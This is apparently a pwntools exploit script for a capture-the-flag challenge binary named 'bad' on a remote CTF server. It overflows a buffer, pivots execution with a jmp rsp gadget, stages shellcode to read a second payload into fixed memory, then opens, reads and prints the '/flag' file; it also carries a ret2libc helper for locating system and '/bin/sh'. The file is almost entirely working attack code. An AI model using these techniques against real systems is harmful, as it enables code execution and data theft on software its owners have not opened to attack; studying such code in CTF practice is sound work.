from pwn import  *
from LibcSearcher import LibcSearcher
from sys import argv

def ret2libc(leak, func, path=''):
	if path == '':
		libc = LibcSearcher(func, leak)
		base = leak - libc.dump(func)
		system = base + libc.dump('system')
		binsh = base + libc.dump('str_bin_sh')
	else:
		libc = ELF(path)
		base = leak - libc.sym[func]
		system = base + libc.sym['system']
		binsh = base + libc.search('/bin/sh').next()

	return (system, binsh)

s       = lambda data               :p.send(str(data))
sa      = lambda delim,data         :p.sendafter(str(delim), str(data))
sl      = lambda data               :p.sendline(str(data))
sla     = lambda delim,data         :p.sendlineafter(str(delim), str(data))
r       = lambda num=4096           :p.recv(num)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
itr     = lambda                    :p.interactive()
uu32    = lambda data               :u32(data.ljust(4,'\0'))
uu64    = lambda data               :u64(data.ljust(8,'\0'))
leak    = lambda name,addr          :log.success('{} = {:#x}'.format(name, addr))

context.log_level = 'DEBUG'
binary = './bad'
context.binary = binary
elf = ELF(binary)
p = remote('node3.buuoj.cn',25028) if argv[1]=='r' else process(binary)
#libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

# start
heap = 0x123000
jmp_rsp = 0x400a01

payload = asm(shellcraft.read(0,heap,0x100))
payload += asm('mov rax,0x123000;call rax')
payload = payload.ljust(0x28,'a')+p64(jmp_rsp)
payload += asm('sub rsp,0x30;jmp rsp')
sa('fun!\n',payload)

payload = asm(shellcraft.open('/flag')+shellcraft.read(3,heap,0x100)+shellcraft.write(1,heap,0x100))
sl(payload)
# end

itr()